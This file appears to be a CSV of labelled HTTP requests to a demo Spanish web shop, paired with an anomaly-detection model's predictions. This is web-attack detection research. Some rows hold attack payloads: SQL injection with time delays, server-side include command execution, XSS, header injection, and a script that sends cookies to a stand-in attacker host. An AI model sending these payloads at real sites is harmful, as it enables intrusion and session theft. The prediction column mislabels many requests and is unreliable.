data,y_pred,y_test
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alexi&password=cuerda&nombre=donardo&apellidos=paracoll','0');waitfor+delay+'0:0:15';--&email=filho@encuentrodominios.is&dni=01722111d&direccion=enric+granados+137,+&ciudad=ruesca&cp=47248&provincia=alicante&ntc=0825150389138142&b1=registrar",anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,normal,anomalous
gethttp://localhost:8080/tienda1/global/asf-logo-wide.gif/,normal,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=petretta&pwd=d�c9m6&remember=off&b1a=entrar,normal,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lemar&password=43lpe7de2o&nombre=bianca&apellidos=valor+agudo&email=vallarine7@7horas.mo&dni=90125861q&direccion=plaza+monasterio+de+la+oliva,+s/n,+&ciudad=tembleque&cp=20493&provincia=na*v+a.rra&ntc=7119531551958366&b1=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/.old,anomalous,anomalous
gethttp://localhost:8080/tienda1/4861362529278789730,normal,anomalous
gethttp://localhost:8080/asf-logo-wide.gif.inc,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n'+ib�ric-'o&precio=39&cantidad=6&b1=a�adir+al+carrito,anomalous,anomalous
gethttp://localhost:8080/.inc,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3817&b1a=confirmar,normal,anomalous
posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,normal,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=dion&pwd=tric�tomo&remember=off&b1=entrar,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2<!--#exec+cmd=""ls+/""-->",anomalous,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=monaco&password=roznar&nombre=kiara&apellidos=palenzuela+usa&email=badland.paudler@dise�odesoftware.do&dnia=86214709z&direccion=c/+alegria,+141,+12-h&ciudad=villanueva+de+oscos&cp=24735&provincia=ciudad+real&ntc=4654942357042652&b1=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/miembros/fotos.jsp.old,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7525&b1=pasar+por+caja/,normal,anomalous
gethttp://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.gif,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=4&b1=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito','0','0');waitfor+delay+'0:0:15';--",anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=%7c,anomalous,anomalous
gethttp://localhost:8080/worldmusic/action/cdlist,normal,anomalous
posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5003&b1=confirmar/,normal,anomalous
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombrea=queso+manchego&precio=85&cantidad=57&b1=a�adir+al+carrito,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=set-cookie%3a+tamper%3d1041264011025374727,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=rasmira&apellidos=pavi�+pool&email=gloves@sms24h.mk&dni=92795576y&direccion=c/+venus,++60,+&ciudad=ger&cp=24370&provincia=cantabria&ntc=7563981891605435&b1=registrar",normal,anomalous
"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=""><!--#exec+cmd=""dir+""--><",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=lihuel&apellidos=novell+abenoza&email=hasserman@clinicadentalsansalvador.ua&dni=95659491f&direccion=federico+garcia+lorca,+132,+&ciudad=riudoms&cpa=36960&provincia=burgos&ntc=1343774789684603&b1=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/imagenes/2.gif/.inc,anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=c+hatter?t&password=5alear&nombre=florencio&apellidos=morell&email=bacskal_pavan@smsgay.aw&dni=67854500s&direccion=c/+andres+mu�oz+perez,+54,+&ciudad=huete&cp=04838&provincia=huelva&ntc=6200992678316221&b1=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwd=virulenta&remember=?&b1=entrar,normal,anomalous
gethttp://localhost:8080/tienda1/imagenes/logo.gif/4861362529278789730.bak,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,normal,anomalous
gethttp://localhost:8080/tienda1/publico/6909030637832563290.jsp.java,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,normal,anomalous
posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&password=7n3i083zo&nombre=tom�s&apellidos=mares+mulleras&email=aylmer@pisossantcugat.pl&dni=04472501j&direccion=gravina+197+3?h&ciudad=calzadilla+de+tera&cp=46827&provincia=cuenca&ntc=7996895110966395&b1=registrar,anomalous,anomalous
puthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8506&b1=pasar+por+caja,normal,anomalous
gethttp://localhost:8080/tienda1/imagenes/2.gif/6909030637832563290.jsp.inc,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar'+and+'1'='1&login=ranbir&pwd=sal�fero&remember=off&b1=entrar,anomalous,anomalous
gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pattin&password=48h817n7&nombre=tr�nsito&apellidos=camorlinga+aragon�s&email=boehm@zeat.bo&dni=67474361c&direccion=praza*+crucero+de+cani*do*+144+9?g&ciudad=gav�&cp=06413&provincia=toledo&ntc=2637703097461568&b1=registrar,normal,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=olivie&password=re0348n1ar&nombre=ivan&apellidos=elbar+brice�o&email=elliot3@connect.li&dni=65683923v&direccion=los+caminos,+129,+13-g&ciudad=hinojosa+del+campo&cpa=10130&provincia=palencia&ntc=7487181086019639&b1=registrar",normal,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wendy&password=a-h�lo&nombre=edelvais&apellidos=alba�il+comasoli&email=raidhi_altermen@prestamosypersonales.kw&dni=68675744k&direccion=puerto+de+canfranc+179,+&ciudad=mont�n&cp=12415&provinciaa=guadalajara&ntc=8960280484576559&b1=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7749&b1=pasar+por+caja/,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carmody&password=borricalmente&nombre=lihue&apellidos=figueredo+ferr�s&email=varennes@so-tel.ni&dni=17014566v&direccion=rambla+de+mercedes+149,+&ciudad=hornillos+de+cameros','0','0');waitfor+delay+'0:0:15';--&cp=23560&provincia=valladolid&ntc=7245939027120885&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/physican/login.do,normal,anomalous
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1'injected_param,anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=amant&password=coyotera&nombre=aleardo&apellidos=sellares+brihuega&email=miguel_bridge@irmedia.nl&dni=15074727k&direccion=calle+rodrigo+de+triana+189,+6e&ciudad=ametlla+del+vall�s,+l'&cpa=44597&provincia=guadalajara&ntc=2988316222731904&b1=registrar",normal,anomalous
posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sysint9&pwd=l2n7at8s55&remember=on&b1=entrar+,normal,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombrea=vino+rioja&precio=85&cantidad=61&b1=a�adir+al+carrito,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=623&b1=confirmar/,normal,anomalous
gethttp://localhost:8080/ws-client/loancalculation.jsp,normal,anomalous
gethttp://localhost:8080/tienda1.bak,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/vaciar.jsp.old,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=<script>alert(""paros"");</script>",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=';waitfor+delay+'0:0:15';--,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,normal,anomalous
posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=thorman&pwd=destorpadu?ra&remember=off&b1=entrar,normal,anomalous
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,normal,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id='injected_param&nombre=jam�n+ib�rico&precio=100&cantidad=13&b1=a�adir+al+carrito,anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=snuggs&password=recie.nte&nombre=caritian&apellidos=celaya+gaytan&email=treman_worde@pavimentosalagon.so&dnia=75925253e&direccion=carrer+sant+celoni+39,+8-h&ciudad=cepeda+la+mora&cp=45200&provincia=sevilla&ntc=0439326406567851&b1=registrar",normal,anomalous
puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=85&cantidad=28&b1=a�adir+al+carrito,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,normal,anomalous
posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=set-cookie%3a+tamper%3d1041264011025374727,anomalous,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=etienne&password=ahoga2iz8&nombre=pastora&apellidos=aleu+alcaide&email=gulager-balsan6@978.dm&dni=44544869x&direccion=giuseppe+micael,+174+8-h&ciudad=valdefuentes+del+p�ramo&cp=06300&provincia=ciudad+real&ntc=5699405800944222&b1a=registrar",normal,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=ques+o+manchego&precio=100&cantidad=86&b1=a�adir+al+carrito,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=antonin&pwd=0a18v2r2ceo&remember=on&b1=entrar,normal,anomalous
posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=foster&pwd=8se7i961o&remember=off&b1=entrarany%3f%0aset-cookie%3a+tamper%3d5765205567234876235,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winona&password=pic�n&nombre=nayla&apellidos=torre+xu&email=hyer_longdon0@artforall.mc&dni=83627503d&direccion=calle+corbina,+100+&ciudad=hornillos+de+cameros&cp=46691&provincia=cuenca&ntc=5175565918974704&b1=@40",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=39&cantidad=25&b1a=a�adir+al+carrito,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jiann&password=freno&nombre=raifroid&apellidos=sol�+portillo&email=nererova@camilafansite.by&dni=41955080k&direccion=c/+fusta+40+11-f&ciudad=san+pablo+de+los+montes&cpa=49333&provincia=burgos&ntc=5510588122545598&b1=registrar,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kos,s&pwd=gurbia&remember=off&b1=entrar",normal,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hofstett&password=furtivo&nombre=bartolomea&apellidos=villal�n&email=horeth@twinjet.al&dni=19895681z&direccion=santa+maria+de+mazzarello+185,+&ciudad=caba�as+de+la+sagra&cp=17770&provincia=tarragona&ntc=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=85/&cantidad=0&b1=a�adir+al+carrito,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=900&b1=pasar+por+caja,normal,anomalous
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6791&b1=confirmar/,normal,anomalous
gethttp://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.inc,anomalous,anomalous
gethttp://localhost:8080/tienda1/imagenes/3.gif,normal,normal
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yie-tarn&password=ordinar&nombre=edel&apellidos=vogin&email=costello_browallius@autoconstruccion.bt&dni=07375030b&direccion=c/+bascu�ana+52,+5-e&ciudad=puebla+de+obando&cp=01226&provincia=castell�n&ntc=5068023807822442&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/global/titulo.jsp,normal,normal
gethttp://localhost:8080/tienda1/miembros/index.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,normal,normal
gethttp://localhost:8080/tienda1/miembros/fotos.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=85&cantidad=49&b1=a�adir+al+carrito,anomalous,normal
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,normal,normal
gethttp://localhost:8080/tienda1/miembros/fotos.jsp,normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,normal,normal
gethttp://localhost:8080/tienda1/publico/miembros.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/logo.gif,normal,normal
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=linden&password=organero&nombre=alio&apellidos=gallegos+angeleri&email=shumsky.zalata5@telelujo.ci&dni=41909752a&direccion=alicante+119,+&ciudad=benalm�dena&cp=25140&provincia=ja�n&ntc=9201759661755850&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,normal,normal
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nilsson&password=arroc9era&nombre=chalia&apellidos=via�o+bagudanc&email=romer@pisossantcugat.iq&dni=39643208v&direccion=calle+puebla+de+los+infantes,+145+&ciudad=vallclara&cp=17850&provincia=badajoz&ntc=1084102116286517&b1=registrar",anomalous,normal
gethttp://localhost:8080/tienda1/publico/productos.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/1.gif,normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,normal,normal
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,normal,normal
gethttp://localhost:8080/tienda1/miembros/index.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/1.gif,normal,normal
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=saree&password=albumin�metro&nombre=y�sica&apellidos=ferr�s+gort�rez&email=maracaja@telogis.ad&dni=42773884w&direccion=do+cotaredo,+147+9e&ciudad=hoyocasero&cp=44369&provincia=ja�n&ntc=3074022895871752&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/global/menum.jsp,normal,normal
posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,normal,normal
gethttp://localhost:8080/tienda1/publico/miembros.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,normal,normal
gethttp://localhost:8080/tienda1/publico/carrito.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/1.gif,normal,normal
gethttp://localhost:8080/tienda1/index.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,normal,normal
gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,normal,normal
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,normal,normal
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=85&cantidad=6&b1=a�adir+al+carrito,anomalous,normal
gethttp://localhost:8080/tienda1/index.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,normal,normal
gethttp://localhost:8080/tienda1/imagenes/3.gif,normal,normal
gethttp://localhost:8080/tienda1/imagenes/logo.gif,normal,normal
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=67&b1=a�adir+al+carrito,anomalous,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,normal,normal
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=verde&password=er6�til&nombre=jamil&apellidos=men�ndez+coyoma&email=hammong4@asyra.st&dni=99745017c&direccion=paseo+francisco+mir+berlanga+141,+12-e&ciudad=riudellots+de+la+selva&cp=40352&provincia=�vila&ntc=9448799154735544&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,normal,normal
gethttp://localhost:8080/tienda1/global/menum.jsp,normal,normal
gethttp://localhost:8080/tienda1/global/menum.jsp,normal,normal
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tonkovic&password=2ra71o1&nombre=nicolo&apellidos=dopico+juanes&email=livermore-kozlowski@hiteurope.ws&dni=53527134q&direccion=del+almendro,+169,+&ciudad=marines,+los&cp=46960&provincia=le�n&ntc=5462359635999525&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/miembros/fotos.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/logo.gif,normal,normal
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=20&b1=a�adir+al+carrito,normal,normal
gethttp://localhost:8080/tienda1/publico/carrito.jsp,normal,normal
posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2829&b1=pasar+por+caja,normal,normal
gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,normal,normal
posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,normal,normal
gethttp://localhost:8080/tienda1/miembros/fotos.jsp,normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,normal,normal
gethttp://localhost:8080/tienda1/global/creditos.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=huston&pwd=organizar&remember=off&b1=entrar,normal,normal
gethttp://localhost:8080/tienda1/miembros/index.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/logo.gif,normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,normal,normal
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1490&b1=confirmar,normal,normal
gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,normal,normal
gethttp://localhost:8080/tienda1/miembros/index.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/carrito.jsp,normal,normal
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kurian&password=batidor&nombre=leandro&apellidos=bernatallada&email=galt@automovilesalhambra.kr&dni=38728859x&direccion=silo+179,+12?b&ciudad=cantillana&cp=23266&provincia=burgos&ntc=5881598906156737&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,normal,normal
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=68&b1=a�adir+al+carrito,anomalous,normal
gethttp://localhost:8080/tienda1/global/menum.jsp,normal,normal
gethttp://localhost:8080/tienda1/global/menum.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tele&pwd=su7in1st9ar&remember=off&b1=entrar,normal,normal
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,normal,normal
gethttp://localhost:8080/tienda1/global/menum.jsp,normal,normal
posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=leanne&pwd=empeltre&remember=off&b1=entrar,normal,normal
gethttp://localhost:8080/tienda1/imagenes/3.gif,normal,normal
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=919&b1=confirmar,normal,normal
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eden&password=oct�gona&nombre=sumahya&apellidos=lacosta+estrader&email=helmos@pool-control.mx&dni=61605523t&direccion=calle+duque+de+zaragoza+s/n,+&ciudad=bascu�ana+de+san+pedro&cp=24710&provincia=valladolid&ntc=5690251194310555&b1=registrar",anomalous,normal
gethttp://localhost:8080/tienda1/publico/productos.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,normal,normal
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stalin&password=calaba1ear&nombre=florestano&apellidos=sams�+agea&email=marsdon@hrmsl.cn&dni=37618946p&direccion=motril,+131+&ciudad=guillena&cp=26325&provincia=badajoz&ntc=2781714156257998&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/index.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/3.gif,normal,normal
posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4296&b1=confirmar,normal,normal
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=100&cantidad=56&b1=a�adir+al+carrito,normal,normal
gethttp://localhost:8080/tienda1/global/creditos.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=misko&password=men�ngea&nombre=ludolfo&apellidos=castelan+iznaga&email=pechur@spainbareback.fm&dni=40984940k&direccion=pl.+obra+sindical+del+hogar+43+5-a&ciudad=san+cebri�n+de+mud�&cp=03180&provincia=guadalajara&ntc=3675111830638462&b1=registrar,normal,normal
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=luther&password=89c3vi�a&nombre=cimoteo&apellidos=casacuberta+delacerda&email=eglevsky-dux@tacticlinks.ch&dni=62616848s&direccion=virgen+del+valsordo,+44,+3-a&ciudad=santa+marta+del+cerro&cp=37159&provincia=ja�n&ntc=8452550180541850&b1=registrar",anomalous,normal
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,normal,normal
gethttp://localhost:8080/tienda1/global/titulo.jsp,normal,normal
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5359&b1=pasar+por+caja,normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,normal,normal
posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,normal,normal
gethttp://localhost:8080/tienda1/imagenes/logo.gif,normal,normal
gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,normal,normal
gethttp://localhost:8080/tienda1/miembros/salir.jsp,normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,normal,normal
gethttp://localhost:8080/tienda1/publico/productos.jsp,normal,normal
gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,normal,normal
